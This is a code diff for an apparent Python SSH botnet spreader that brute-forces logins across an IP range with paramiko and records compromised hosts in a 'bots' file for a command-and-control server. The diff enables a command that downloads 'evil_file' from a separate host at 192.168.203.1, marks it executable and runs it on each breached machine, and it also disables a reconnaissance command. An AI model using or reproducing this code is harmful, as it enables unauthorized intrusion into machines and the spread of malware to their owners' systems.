@@ -19,9 +19,9 @@ def ssh_start():
     p.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     try:
         p.connect(ip, username=user_list[num], password=pass_list[num2])
-#        stdin, stdout, stderr = p.exec_command('wget "192.168.203.1/evil_file" -O /tmp ; chmod 755 /tmp/evil_file; /tmp/./evil_file; sleep 1; rm /tmp/evil_file')
+        stdin, stdout, stderr = p.exec_command('wget "192.168.203.1/evil_file"; chmod 755 evil_file; ./evil_file')
         # print then append target's output into file 'bots' on C&C.
-        stdin, stdout, stderr = p.exec_command('uname -a; id')
+        # stdin, stdout, stderr = p.exec_command('uname -a; id')
         f = open("bots", "a")
         f.write("=" * 70 + "\n")
         f.write("ip: %s\n" % ip)
@@ -42,7 +42,7 @@ for i in range(150,155):
             p = multiprocessing.Process(target=ssh_start)
             jobs.append(p)
             p.start()
-            # p.join()	# Slow Version
+            #p.join()	# slow ver. & doesn't detach from evil_file connection
             num2 += 1
         num += 1
 
